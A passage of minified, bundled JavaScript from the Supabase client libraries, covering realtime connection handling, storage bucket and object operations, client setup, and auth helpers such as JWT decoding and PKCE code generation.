Blob([GT],{type:"application/javascript"});r=URL.createObjectURL(s)}return r}_setConnectionState(e,r=!1){this._connectionState=e,e==="connecting"?this._wasManualDisconnect=!1:e==="disconnecting"&&(this._wasManualDisconnect=r)}async _performAuth(e=null){let r;e?r=e:this.accessToken?r=await this.accessToken():r=this.accessTokenValue,this.accessTokenValue!=r&&(this.accessTokenValue=r,this.channels.forEach(s=>{const a={access_token:r,version:jT};r&&s.updateJoinPayload(a),s.joinedOnce&&s._isJoined()&&s._push(Gt.access_token,{access_token:r})}))}async _waitForAuthIfNeeded(){this._authPromise&&await this._authPromise}_setAuthSafely(e="general"){this.setAuth().catch(r=>{this.log("error",`error setting auth in ${e}`,r)})}_triggerStateCallbacks(e,r){try{this.stateChangeCallbacks[e].forEach(s=>{try{s(r)}catch(a){this.log("error",`error in ${e} callback`,a)}})}catch(s){this.log("error",`error triggering ${e} callbacks`,s)}}_setupReconnectionTimer(){this.reconnectTimer=new Ib(async()=>{setTimeout(async()=>{await this._waitForAuthIfNeeded(),this.isConnected()||this.connect()},Xo.RECONNECT_DELAY)},this.reconnectAfterMs)}_initializeOptions(e){var r,s,a,l,c,d,p,f,m;if(this.transport=(r=e?.transport)!==null&&r!==void 0?r:null,this.timeout=(s=e?.timeout)!==null&&s!==void 0?s:Su,this.heartbeatIntervalMs=(a=e?.heartbeatIntervalMs)!==null&&a!==void 0?a:Xo.HEARTBEAT_INTERVAL,this.worker=(l=e?.worker)!==null&&l!==void 0?l:!1,this.accessToken=(c=e?.accessToken)!==null&&c!==void 0?c:null,this.heartbeatCallback=(d=e?.heartbeatCallback)!==null&&d!==void 0?d:Jc,e?.params&&(this.params=e.params),e?.logger&&(this.logger=e.logger),(e?.logLevel||e?.log_level)&&(this.logLevel=e.logLevel||e.log_level,this.params=Object.assign(Object.assign({},this.params),{log_level:this.logLevel})),this.reconnectAfterMs=(p=e?.reconnectAfterMs)!==null&&p!==void 0?p:(y=>HT[y-1]||qT),this.encode=(f=e?.encode)!==null&&f!==void 0?f:((y,v)=>v(JSON.stringify(y))),this.decode=(m=e?.decode)!==null&&m!==void 0?m:this.serializer.decode.bind(this.serializer),this.worker){if(typeof window<"u"&&!window.Worker)throw new Error("Web Worker is not supported");this.workerUrl=e?.workerUrl}}}class fd extends Error{constructor(e){super(e),this.__isStorageError=!0,this.name="StorageError"}}function qe(n){return typeof n=="object"&&n!==null&&"__isStorageError"in n}class JT extends fd{constructor(e,r,s){super(e),this.name="StorageApiError",this.status=r,this.statusCode=s}toJSON(){return{name:this.name,message:this.message,status:this.status,statusCode:this.statusCode}}}class Cu extends fd{constructor(e,r){super(e),this.name="StorageUnknownError",this.originalError=r}}var QT=function(n,e,r,s){function a(l){return l instanceof r?l:new r(function(c){c(l)})}return new(r||(r=Promise))(function(l,c){function d(m){try{f(s.next(m))}catch(y){c(y)}}function p(m){try{f(s.throw(m))}catch(y){c(y)}}function f(m){m.done?l(m.value):a(m.value).then(d,p)}f((s=s.apply(n,e||[])).next())})};const Ob=n=>{let e;return n?e=n:typeof fetch>"u"?e=(...r)=>Rs(async()=>{const{default:s}=await Promise.resolve().then(()=>vi);return{default:s}},void 0).then(({default:s})=>s(...r)):e=fetch,(...r)=>e(...r)},YT=()=>QT(void 0,void 0,void 0,function*(){return typeof Response>"u"?(yield Rs(()=>Promise.resolve().then(()=>vi),void 0)).Response:Response}),Eu=n=>{if(Array.isArray(n))return n.map(r=>Eu(r));if(typeof n=="function"||n!==Object(n))return n;const e={};return Object.entries(n).forEach(([r,s])=>{const a=r.replace(/([-_][a-z])/gi,l=>l.toUpperCase().replace(/[-_]/g,""));e[a]=Eu(s)}),e},XT=n=>{if(typeof n!="object"||n===null)return!1;const e=Object.getPrototypeOf(n);return(e===null||e===Object.prototype||Object.getPrototypeOf(e)===null)&&!(Symbol.toStringTag in n)&&!(Symbol.iterator in n)};var Cr=function(n,e,r,s){function a(l){return l instanceof r?l:new r(function(c){c(l)})}return new(r||(r=Promise))(function(l,c){function d(m){try{f(s.next(m))}catch(y){c(y)}}function p(m){try{f(s.throw(m))}catch(y){c(y)}}function f(m){m.done?l(m.value):a(m.value).then(d,p)}f((s=s.apply(n,e||[])).next())})};const Qc=n=>n.msg||n.message||n.error_description||n.error||JSON.stringify(n),ZT=(n,e,r)=>Cr(void 0,void 0,void 0,function*(){const s=yield YT();n instanceof s&&!r?.noResolveJson?n.json().then(a=>{const l=n.status||500,c=a?.statusCode||l+"";e(new JT(Qc(a),l,c))}).catch(a=>{e(new Cu(Qc(a),a))}):e(new Cu(Qc(n),n))}),eA=(n,e,r,s)=>{const a={method:n,headers:e?.headers||{}};return n==="GET"||!s?a:(XT(s)?(a.headers=Object.assign({"Content-Type":"application/json"},e?.headers),a.body=JSON.stringify(s)):a.body=s,e?.duplex&&(a.duplex=e.duplex),Object.assign(Object.assign({},a),r))};function Ds(n,e,r,s,a,l){return Cr(this,void 0,void 0,function*(){return new Promise((c,d)=>{n(r,eA(e,s,a,l)).then(p=>{if(!p.ok)throw p;return s?.noResolveJson?p:p.json()}).then(p=>c(p)).catch(p=>ZT(p,d,s))})})}function ma(n,e,r,s){return Cr(this,void 0,void 0,function*(){return Ds(n,"GET",e,r,s)})}function en(n,e,r,s,a){return Cr(this,void 0,void 0,function*(){return Ds(n,"POST",e,s,a,r)})}function Pu(n,e,r,s,a){return Cr(this,void 0,void 0,function*(){return Ds(n,"PUT",e,s,a,r)})}function tA(n,e,r,s){return Cr(this,void 0,void 0,function*(){return Ds(n,"HEAD",e,Object.assign(Object.assign({},r),{noResolveJson:!0}),s)})}function jb(n,e,r,s,a){return Cr(this,void 0,void 0,function*(){return Ds(n,"DELETE",e,s,a,r)})}var nA=function(n,e,r,s){function a(l){return l instanceof r?l:new r(function(c){c(l)})}return new(r||(r=Promise))(function(l,c){function d(m){try{f(s.next(m))}catch(y){c(y)}}function p(m){try{f(s.throw(m))}catch(y){c(y)}}function f(m){m.done?l(m.value):a(m.value).then(d,p)}f((s=s.apply(n,e||[])).next())})};class rA{constructor(e,r){this.downloadFn=e,this.shouldThrowOnError=r}then(e,r){return this.execute().then(e,r)}execute(){return nA(this,void 0,void 0,function*(){try{return{data:(yield this.downloadFn()).body,error:null}}catch(e){if(this.shouldThrowOnError)throw e;if(qe(e))return{data:null,error:e};throw e}})}}var iA=function(n,e,r,s){function a(l){return l instanceof r?l:new r(function(c){c(l)})}return new(r||(r=Promise))(function(l,c){function d(m){try{f(s.next(m))}catch(y){c(y)}}function p(m){try{f(s.throw(m))}catch(y){c(y)}}function f(m){m.done?l(m.value):a(m.value).then(d,p)}f((s=s.apply(n,e||[])).next())})};class sA{constructor(e,r){this.downloadFn=e,this.shouldThrowOnError=r}asStream(){return new rA(this.downloadFn,this.shouldThrowOnError)}then(e,r){return this.execute().then(e,r)}execute(){return iA(this,void 0,void 0,function*(){try{return{data:yield(yield this.downloadFn()).blob(),error:null}}catch(e){if(this.shouldThrowOnError)throw e;if(qe(e))return{data:null,error:e};throw e}})}}var vt=function(n,e,r,s){function a(l){return l instanceof r?l:new r(function(c){c(l)})}return new(r||(r=Promise))(function(l,c){function d(m){try{f(s.next(m))}catch(y){c(y)}}function p(m){try{f(s.throw(m))}catch(y){c(y)}}function f(m){m.done?l(m.value):a(m.value).then(d,p)}f((s=s.apply(n,e||[])).next())})};const oA={limit:100,offset:0,sortBy:{column:"name",order:"asc"}},Hg={cacheControl:"3600",contentType:"text/plain;charset=UTF-8",upsert:!1};class aA{constructor(e,r={},s,a){this.shouldThrowOnError=!1,this.url=e,this.headers=r,this.bucketId=s,this.fetch=Ob(a)}throwOnError(){return this.shouldThrowOnError=!0,this}uploadOrUpdate(e,r,s,a){return vt(this,void 0,void 0,function*(){try{let l;const c=Object.assign(Object.assign({},Hg),a);let d=Object.assign(Object.assign({},this.headers),e==="POST"&&{"x-upsert":String(c.upsert)});const p=c.metadata;typeof Blob<"u"&&s instanceof Blob?(l=new FormData,l.append("cacheControl",c.cacheControl),p&&l.append("metadata",this.encodeMetadata(p)),l.append("",s)):typeof FormData<"u"&&s instanceof FormData?(l=s,l.append("cacheControl",c.cacheControl),p&&l.append("metadata",this.encodeMetadata(p))):(l=s,d["cache-control"]=`max-age=${c.cacheControl}`,d["content-type"]=c.contentType,p&&(d["x-metadata"]=this.toBase64(this.encodeMetadata(p)))),a?.headers&&(d=Object.assign(Object.assign({},d),a.headers));const f=this._removeEmptyFolders(r),m=this._getFinalPath(f),y=yield(e=="PUT"?Pu:en)(this.fetch,`${this.url}/object/${m}`,l,Object.assign({headers:d},c?.duplex?{duplex:c.duplex}:{}));return{data:{path:f,id:y.Id,fullPath:y.Key},error:null}}catch(l){if(this.shouldThrowOnError)throw l;if(qe(l))return{data:null,error:l};throw l}})}upload(e,r,s){return vt(this,void 0,void 0,function*(){return this.uploadOrUpdate("POST",e,r,s)})}uploadToSignedUrl(e,r,s,a){return vt(this,void 0,void 0,function*(){const l=this._removeEmptyFolders(e),c=this._getFinalPath(l),d=new URL(this.url+`/object/upload/sign/${c}`);d.searchParams.set("token",r);try{let p;const f=Object.assign({upsert:Hg.upsert},a),m=Object.assign(Object.assign({},this.headers),{"x-upsert":String(f.upsert)});typeof Blob<"u"&&s instanceof Blob?(p=new FormData,p.append("cacheControl",f.cacheControl),p.append("",s)):typeof FormData<"u"&&s instanceof FormData?(p=s,p.append("cacheControl",f.cacheControl)):(p=s,m["cache-control"]=`max-age=${f.cacheControl}`,m["content-type"]=f.contentType);const y=yield Pu(this.fetch,d.toString(),p,{headers:m});return{data:{path:l,fullPath:y.Key},error:null}}catch(p){if(this.shouldThrowOnError)throw p;if(qe(p))return{data:null,error:p};throw p}})}createSignedUploadUrl(e,r){return vt(this,void 0,void 0,function*(){try{let s=this._getFinalPath(e);const a=Object.assign({},this.headers);r?.upsert&&(a["x-upsert"]="true");const l=yield en(this.fetch,`${this.url}/object/upload/sign/${s}`,{},{headers:a}),c=new URL(this.url+l.url),d=c.searchParams.get("token");if(!d)throw new fd("No token returned by API");return{data:{signedUrl:c.toString(),path:e,token:d},error:null}}catch(s){if(this.shouldThrowOnError)throw s;if(qe(s))return{data:null,error:s};throw s}})}update(e,r,s){return vt(this,void 0,void 0,function*(){return this.uploadOrUpdate("PUT",e,r,s)})}move(e,r,s){return vt(this,void 0,void 0,function*(){try{return{data:yield en(this.fetch,`${this.url}/object/move`,{bucketId:this.bucketId,sourceKey:e,destinationKey:r,destinationBucket:s?.destinationBucket},{headers:this.headers}),error:null}}catch(a){if(this.shouldThrowOnError)throw a;if(qe(a))return{data:null,error:a};throw a}})}copy(e,r,s){return vt(this,void 0,void 0,function*(){try{return{data:{path:(yield en(this.fetch,`${this.url}/object/copy`,{bucketId:this.bucketId,sourceKey:e,destinationKey:r,destinationBucket:s?.destinationBucket},{headers:this.headers})).Key},error:null}}catch(a){if(this.shouldThrowOnError)throw a;if(qe(a))return{data:null,error:a};throw a}})}createSignedUrl(e,r,s){return vt(this,void 0,void 0,function*(){try{let a=this._getFinalPath(e),l=yield en(this.fetch,`${this.url}/object/sign/${a}`,Object.assign({expiresIn:r},s?.transform?{transform:s.transform}:{}),{headers:this.headers});const c=s?.download?`&download=${s.download===!0?"":s.download}`:"";return l={signedUrl:encodeURI(`${this.url}${l.signedURL}${c}`)},{data:l,error:null}}catch(a){if(this.shouldThrowOnError)throw a;if(qe(a))return{data:null,error:a};throw a}})}createSignedUrls(e,r,s){return vt(this,void 0,void 0,function*(){try{const a=yield en(this.fetch,`${this.url}/object/sign/${this.bucketId}`,{expiresIn:r,paths:e},{headers:this.headers}),l=s?.download?`&download=${s.download===!0?"":s.download}`:"";return{data:a.map(c=>Object.assign(Object.assign({},c),{signedUrl:c.signedURL?encodeURI(`${this.url}${c.signedURL}${l}`):null})),error:null}}catch(a){if(this.shouldThrowOnError)throw a;if(qe(a))return{data:null,error:a};throw a}})}download(e,r){const a=typeof r?.transform<"u"?"render/image/authenticated":"object",l=this.transformOptsToQueryString(r?.transform||{}),c=l?`?${l}`:"",d=this._getFinalPath(e),p=()=>ma(this.fetch,`${this.url}/${a}/${d}${c}`,{headers:this.headers,noResolveJson:!0});return new sA(p,this.shouldThrowOnError)}info(e){return vt(this,void 0,void 0,function*(){const r=this._getFinalPath(e);try{const s=yield ma(this.fetch,`${this.url}/object/info/${r}`,{headers:this.headers});return{data:Eu(s),error:null}}catch(s){if(this.shouldThrowOnError)throw s;if(qe(s))return{data:null,error:s};throw s}})}exists(e){return vt(this,void 0,void 0,function*(){const r=this._getFinalPath(e);try{return yield tA(this.fetch,`${this.url}/object/${r}`,{headers:this.headers}),{data:!0,error:null}}catch(s){if(this.shouldThrowOnError)throw s;if(qe(s)&&s instanceof Cu){const a=s.originalError;if([400,404].includes(a?.status))return{data:!1,error:s}}throw s}})}getPublicUrl(e,r){const s=this._getFinalPath(e),a=[],l=r?.download?`download=${r.download===!0?"":r.download}`:"";l!==""&&a.push(l);const d=typeof r?.transform<"u"?"render/image":"object",p=this.transformOptsToQueryString(r?.transform||{});p!==""&&a.push(p);let f=a.join("&");return f!==""&&(f=`?${f}`),{data:{publicUrl:encodeURI(`${this.url}/${d}/public/${s}${f}`)}}}remove(e){return vt(this,void 0,void 0,function*(){try{return{data:yield jb(this.fetch,`${this.url}/object/${this.bucketId}`,{prefixes:e},{headers:this.headers}),error:null}}catch(r){if(this.shouldThrowOnError)throw r;if(qe(r))return{data:null,error:r};throw r}})}list(e,r,s){return vt(this,void 0,void 0,function*(){try{const a=Object.assign(Object.assign(Object.assign({},oA),r),{prefix:e||""});return{data:yield en(this.fetch,`${this.url}/object/list/${this.bucketId}`,a,{headers:this.headers},s),error:null}}catch(a){if(this.shouldThrowOnError)throw a;if(qe(a))return{data:null,error:a};throw a}})}listV2(e,r){return vt(this,void 0,void 0,function*(){try{const s=Object.assign({},e);return{data:yield en(this.fetch,`${this.url}/object/list-v2/${this.bucketId}`,s,{headers:this.headers},r),error:null}}catch(s){if(this.shouldThrowOnError)throw s;if(qe(s))return{data:null,error:s};throw s}})}encodeMetadata(e){return JSON.stringify(e)}toBase64(e){return typeof Buffer<"u"?Buffer.from(e).toString("base64"):btoa(e)}_getFinalPath(e){return`${this.bucketId}/${e.replace(/^\/+/,"")}`}_removeEmptyFolders(e){return e.replace(/^\/|\/$/g,"").replace(/\/+/g,"/")}transformOptsToQueryString(e){const r=[];return e.width&&r.push(`width=${e.width}`),e.height&&r.push(`height=${e.height}`),e.resize&&r.push(`resize=${e.resize}`),e.format&&r.push(`format=${e.format}`),e.quality&&r.push(`quality=${e.quality}`),r.join("&")}}const lA="2.74.0",cA={"X-Client-Info":`storage-js/${lA}`};var ri=function(n,e,r,s){function a(l){return l instanceof r?l:new r(function(c){c(l)})}return new(r||(r=Promise))(function(l,c){function d(m){try{f(s.next(m))}catch(y){c(y)}}function p(m){try{f(s.throw(m))}catch(y){c(y)}}function f(m){m.done?l(m.value):a(m.value).then(d,p)}f((s=s.apply(n,e||[])).next())})};class uA{constructor(e,r={},s,a){this.shouldThrowOnError=!1;const l=new URL(e);a?.useNewHostname&&/supabase\.(co|in|red)$/.test(l.hostname)&&!l.hostname.includes("storage.supabase.")&&(l.hostname=l.hostname.replace("supabase.","storage.supabase.")),this.url=l.href.replace(/\/$/,""),this.headers=Object.assign(Object.assign({},cA),r),this.fetch=Ob(s)}throwOnError(){return this.shouldThrowOnError=!0,this}listBuckets(){return ri(this,void 0,void 0,function*(){try{return{data:yield ma(this.fetch,`${this.url}/bucket`,{headers:this.headers}),error:null}}catch(e){if(this.shouldThrowOnError)throw e;if(qe(e))return{data:null,error:e};throw e}})}getBucket(e){return ri(this,void 0,void 0,function*(){try{return{data:yield ma(this.fetch,`${this.url}/bucket/${e}`,{headers:this.headers}),error:null}}catch(r){if(this.shouldThrowOnError)throw r;if(qe(r))return{data:null,error:r};throw r}})}createBucket(e){return ri(this,arguments,void 0,function*(r,s={public:!1}){try{return{data:yield en(this.fetch,`${this.url}/bucket`,{id:r,name:r,type:s.type,public:s.public,file_size_limit:s.fileSizeLimit,allowed_mime_types:s.allowedMimeTypes},{headers:this.headers}),error:null}}catch(a){if(this.shouldThrowOnError)throw a;if(qe(a))return{data:null,error:a};throw a}})}updateBucket(e,r){return ri(this,void 0,void 0,function*(){try{return{data:yield Pu(this.fetch,`${this.url}/bucket/${e}`,{id:e,name:e,public:r.public,file_size_limit:r.fileSizeLimit,allowed_mime_types:r.allowedMimeTypes},{headers:this.headers}),error:null}}catch(s){if(this.shouldThrowOnError)throw s;if(qe(s))return{data:null,error:s};throw s}})}emptyBucket(e){return ri(this,void 0,void 0,function*(){try{return{data:yield en(this.fetch,`${this.url}/bucket/${e}/empty`,{},{headers:this.headers}),error:null}}catch(r){if(this.shouldThrowOnError)throw r;if(qe(r))return{data:null,error:r};throw r}})}deleteBucket(e){return ri(this,void 0,void 0,function*(){try{return{data:yield jb(this.fetch,`${this.url}/bucket/${e}`,{},{headers:this.headers}),error:null}}catch(r){if(this.shouldThrowOnError)throw r;if(qe(r))return{data:null,error:r};throw r}})}}class dA extends uA{constructor(e,r={},s,a){super(e,r,s,a)}from(e){return new aA(this.url,this.headers,e,this.fetch)}}const hA="2.74.0";let ds="";typeof Deno<"u"?ds="deno":typeof document<"u"?ds="web":typeof navigator<"u"&&navigator.product==="ReactNative"?ds="react-native":ds="node";const pA={"X-Client-Info":`supabase-js-${ds}/${hA}`},fA={headers:pA},gA={schema:"public"},mA={autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,flowType:"implicit"},yA={};var bA=function(n,e,r,s){function a(l){return l instanceof r?l:new r(function(c){c(l)})}return new(r||(r=Promise))(function(l,c){function d(m){try{f(s.next(m))}catch(y){c(y)}}function p(m){try{f(s.throw(m))}catch(y){c(y)}}function f(m){m.done?l(m.value):a(m.value).then(d,p)}f((s=s.apply(n,e||[])).next())})};const vA=n=>{let e;return n?e=n:typeof fetch>"u"?e=Tb:e=fetch,(...r)=>e(...r)},wA=()=>typeof Headers>"u"?Ab:Headers,kA=(n,e,r)=>{const s=vA(r),a=wA();return(l,c)=>bA(void 0,void 0,void 0,function*(){var d;const p=(d=yield e())!==null&&d!==void 0?d:n;let f=new a(c?.headers);return f.has("apikey")||f.set("apikey",n),f.has("Authorization")||f.set("Authorization",`Bearer ${p}`),s(l,Object.assign(Object.assign({},c),{headers:f}))})};var xA=function(n,e,r,s){function a(l){return l instanceof r?l:new r(function(c){c(l)})}return new(r||(r=Promise))(function(l,c){function d(m){try{f(s.next(m))}catch(y){c(y)}}function p(m){try{f(s.throw(m))}catch(y){c(y)}}function f(m){m.done?l(m.value):a(m.value).then(d,p)}f((s=s.apply(n,e||[])).next())})};function SA(n){return n.endsWith("/")?n:n+"/"}function TA(n,e){var r,s;const{db:a,auth:l,realtime:c,global:d}=n,{db:p,auth:f,realtime:m,global:y}=e,v={db:Object.assign(Object.assign({},p),a),auth:Object.assign(Object.assign({},f),l),realtime:Object.assign(Object.assign({},m),c),storage:{},global:Object.assign(Object.assign(Object.assign({},y),d),{headers:Object.assign(Object.assign({},(r=y?.headers)!==null&&r!==void 0?r:{}),(s=d?.headers)!==null&&s!==void 0?s:{})}),accessToken:()=>xA(this,void 0,void 0,function*(){return""})};return n.accessToken?v.accessToken=n.accessToken:delete v.accessToken,v}function AA(n){const e=n?.trim();if(!e)throw new Error("supabaseUrl is required.");if(!e.match(/^https?:\/\//i))throw new Error("Invalid supabaseUrl: Must be a valid HTTP or HTTPS URL.");try{return new URL(SA(e))}catch{throw Error("Invalid supabaseUrl: Provided URL is malformed.")}}const Mb="2.74.0",ci=30*1e3,_u=3,Yc=_u*ci,CA="http://localhost:9999",EA="supabase.auth.token",PA={"X-Client-Info":`gotrue-js/${Mb}`},Iu="X-Supabase-Api-Version",Bb={"2024-01-01":{timestamp:Date.parse("2024-01-01T00:00:00.0Z"),name:"2024-01-01"}},_A=/^([a-z0-9_-]{4})*($|[a-z0-9_-]{3}$|[a-z0-9_-]{2}$)$/i,IA=600*1e3;class Ts extends Error{constructor(e,r,s){super(e),this.__isAuthError=!0,this.name="AuthError",this.status=r,this.code=s}}function oe(n){return typeof n=="object"&&n!==null&&"__isAuthError"in n}class RA extends Ts{constructor(e,r,s){super(e,r,s),this.name="AuthApiError",this.status=r,this.code=s}}function DA(n){return oe(n)&&n.name==="AuthApiError"}class mr extends Ts{constructor(e,r){super(e),this.name="AuthUnknownError",this.originalError=r}}class Kn extends Ts{constructor(e,r,s,a){super(e,s,a),this.name=r,this.status=s}}class Un extends Kn{constructor(){super("Auth session missing!","AuthSessionMissingError",400,void 0)}}function OA(n){return oe(n)&&n.name==="AuthSessionMissingError"}class ii extends Kn{constructor(){super("Auth session or user missing","AuthInvalidTokenResponseError",500,void 0)}}class Zo extends Kn{constructor(e){super(e,"AuthInvalidCredentialsError",400,void 0)}}class ea extends Kn{constructor(e,r=null){super(e,"AuthImplicitGrantRedirectError",500,void 0),this.details=null,this.details=r}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}function jA(n){return oe(n)&&n.name==="AuthImplicitGrantRedirectError"}class qg extends Kn{constructor(e,r=null){super(e,"AuthPKCEGrantCodeExchangeError",500,void 0),this.details=null,this.details=r}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class Ru extends Kn{constructor(e,r){super(e,"AuthRetryableFetchError",r,void 0)}}function Xc(n){return oe(n)&&n.name==="AuthRetryableFetchError"}class Gg extends Kn{constructor(e,r,s){super(e,"AuthWeakPasswordError",r,"weak_password"),this.reasons=s}}class Du extends Kn{constructor(e){super(e,"AuthInvalidJwtError",400,"invalid_jwt")}}const ya="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".split(""),Kg=` 	
\r=`.split(""),MA=(()=>{const n=new Array(128);for(let e=0;e<n.length;e+=1)n[e]=-1;for(let e=0;e<Kg.length;e+=1)n[Kg[e].charCodeAt(0)]=-2;for(let e=0;e<ya.length;e+=1)n[ya[e].charCodeAt(0)]=e;return n})();function Jg(n,e,r){if(n!==null)for(e.queue=e.queue<<8|n,e.queuedBits+=8;e.queuedBits>=6;){const s=e.queue>>e.queuedBits-6&63;r(ya[s]),e.queuedBits-=6}else if(e.queuedBits>0)for(e.queue=e.queue<<6-e.queuedBits,e.queuedBits=6;e.queuedBits>=6;){const s=e.queue>>e.queuedBits-6&63;r(ya[s]),e.queuedBits-=6}}function Nb(n,e,r){const s=MA[n];if(s>-1)for(e.queue=e.queue<<6|s,e.queuedBits+=6;e.queuedBits>=8;)r(e.queue>>e.queuedBits-8&255),e.queuedBits-=8;else{if(s===-2)return;throw new Error(`Invalid Base64-URL character "${String.fromCharCode(n)}"`)}}function Qg(n){const e=[],r=c=>{e.push(String.fromCodePoint(c))},s={utf8seq:0,codepoint:0},a={queue:0,queuedBits:0},l=c=>{LA(c,s,r)};for(let c=0;c<n.length;c+=1)Nb(n.charCodeAt(c),a,l);return e.join("")}function BA(n,e){if(n<=127){e(n);return}else if(n<=2047){e(192|n>>6),e(128|n&63);return}else if(n<=65535){e(224|n>>12),e(128|n>>6&63),e(128|n&63);return}else if(n<=1114111){e(240|n>>18),e(128|n>>12&63),e(128|n>>6&63),e(128|n&63);return}throw new Error(`Unrecognized Unicode codepoint: ${n.toString(16)}`)}function NA(n,e){for(let r=0;r<n.length;r+=1){let s=n.charCodeAt(r);if(s>55295&&s<=56319){const a=(s-55296)*1024&65535;s=(n.charCodeAt(r+1)-56320&65535|a)+65536,r+=1}BA(s,e)}}function LA(n,e,r){if(e.utf8seq===0){if(n<=127){r(n);return}for(let s=1;s<6;s+=1)if((n>>7-s&1)===0){e.utf8seq=s;break}if(e.utf8seq===2)e.codepoint=n&31;else if(e.utf8seq===3)e.codepoint=n&15;else if(e.utf8seq===4)e.codepoint=n&7;else throw new Error("Invalid UTF-8 sequence");e.utf8seq-=1}else if(e.utf8seq>0){if(n<=127)throw new Error("Invalid UTF-8 sequence");e.codepoint=e.codepoint<<6|n&63,e.utf8seq-=1,e.utf8seq===0&&r(e.codepoint)}}function gi(n){const e=[],r={queue:0,queuedBits:0},s=a=>{e.push(a)};for(let a=0;a<n.length;a+=1)Nb(n.charCodeAt(a),r,s);return new Uint8Array(e)}function FA(n){const e=[];return NA(n,r=>e.push(r)),new Uint8Array(e)}function vr(n){const e=[],r={queue:0,queuedBits:0},s=a=>{e.push(a)};return n.forEach(a=>Jg(a,r,s)),Jg(null,r,s),e.join("")}function UA(n){return Math.round(Date.now()/1e3)+n}function zA(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(n){const e=Math.random()*16|0;return(n=="x"?e:e&3|8).toString(16)})}const Ct=()=>typeof window<"u"&&typeof document<"u",cr={tested:!1,writable:!1},Lb=()=>{if(!Ct())return!1;try{if(typeof globalThis.localStorage!="object")return!1}catch{return!1}if(cr.tested)return cr.writable;const n=`lswt-${Math.random()}${Math.random()}`;try{globalThis.localStorage.setItem(n,n),globalThis.localStorage.removeItem(n),cr.tested=!0,cr.writable=!0}catch{cr.tested=!0,cr.writable=!1}return cr.writable};function VA(n){const e={},r=new URL(n);if(r.hash&&r.hash[0]==="#")try{new URLSearchParams(r.hash.substring(1)).forEach((a,l)=>{e[l]=a})}catch{}return r.searchParams.forEach((s,a)=>{e[a]=s}),e}const Fb=n=>{let e;return n?e=n:typeof fetch>"u"?e=(...r)=>Rs(async()=>{const{default:s}=await Promise.resolve().then(()=>vi);return{default:s}},void 0).then(({default:s})=>s(...r)):e=fetch,(...r)=>e(...r)},WA=n=>typeof n=="object"&&n!==null&&"status"in n&&"ok"in n&&"json"in n&&typeof n.json=="function",ui=async(n,e,r)=>{await n.setItem(e,JSON.stringify(r))},ur=async(n,e)=>{const r=await n.getItem(e);if(!r)return null;try{return JSON.parse(r)}catch{return r}},Ln=async(n,e)=>{await n.removeItem(e)};class Ra{constructor(){this.promise=new Ra.promiseConstructor((e,r)=>{this.resolve=e,this.reject=r})}}Ra.promiseConstructor=Promise;function Zc(n){const e=n.split(".");if(e.length!==3)throw new Du("Invalid JWT structure");for(let s=0;s<e.length;s++)if(!_A.test(e[s]))throw new Du("JWT not in base64url format");return{header:JSON.parse(Qg(e[0])),payload:JSON.parse(Qg(e[1])),signature:gi(e[2]),raw:{header:e[0],payload:e[1]}}}async function $A(n){return await new Promise(e=>{setTimeout(()=>e(null),n)})}function HA(n,e){return new Promise((s,a)=>{(async()=>{for(let l=0;l<1/0;l++)try{const c=await n(l);if(!e(l,null,c)){s(c);return}}catch(c){if(!e(l,c)){a(c);return}}})()})}function qA(n){return("0"+n.toString(16)).substr(-2)}function GA(){const e=new Uint32Array(56);if(typeof crypto>"u"){const r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~",s=r.length;let a="";for(let l=0;l<56;l++)a+=r.charAt(Math.floor(Math.random()*s));return a}return crypto.getRandomValues(e),Array.from(e,qA).join("")}async function KA(n){const r=new TextEncoder().encode(n),s=await crypto.subtle.digest("SHA-256",r),a=new Uint8Array(s);return Array.from(a).map(l=>String.fromCharCode(l)).join("")}async function JA(n){if(!(typeof crypto<"u"&&typeof crypto.subtle<"u"&&typeof TextEncoder<"u"))return console.warn("WebCrypto API is not supported. Code challenge method will default to use plain instead of sha256."),n;const r=await KA(n);return btoa(r).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}async function si(n,e,r=!1){const s=GA();let a=s;r&&(a+="/PASSWORD_RECOVERY"),await ui(n,`${e}-code-verifier`,a);const l=await JA(s);return[l,s===l?"plain":"s256"]}const QA=/^2[0-9]{3}-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[0-9]|3[0-1])$/i;function YA(n){const e=n.headers.get(Iu);if(!e||!e.match(QA))return null;try{return new Date(`${e}T00:00:00.0Z`)}catch{return null}}function XA(n){if(!n)throw new Error("Missing exp claim");const e=Math.floor(Date.now()/1e3);if(n<=e)throw new Error("JWT has expired")}function ZA(n){switch(n){case"RS256":return{name:"RSASSA-PKCS1-v1_5",hash:{name:"SHA-256"}};case"ES256":return{name:"ECDSA",namedCurve:"P-256",hash:{name:"SHA-256"}};default:throw new Error("Invalid alg claim")}}const eC=/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;function oi(n){if(!eC.test(n))throw new Error("@supabase/auth-js: Expected parameter to be UUID but is not")}function eu(){const n={};return new Proxy(n,{get:(e,r)=>{if(r==="__isUserNotAvailableProxy")return!0;if(typeof r=="symbol"){const s=r.toString();if(s==="Symbol(Symbol.toPrimitive)"||s==="Symbol(Symbol.toStringTag)"||s==="Symbol(util.inspect.custom)")return}throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Accessing the "${r}" property of the session object is not supported. Please use getUser() instead.`)},set:(e,r)=>{throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Setting the "${r}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`)},deleteProperty:(e,r)=>{throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Deleting the "${r}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`)}})}function Yg(n){return JSON.parse(JSON.stringify(n))}var tC=function(n,e){var r={};for(var s in n)Object.prototype.hasOwnProperty.call(n,s)&&e.indexOf(s)<0&&(r[s]=n[s]);if(n!=null&&typeof Object.getOwnPropertySymbols=="function")for(var 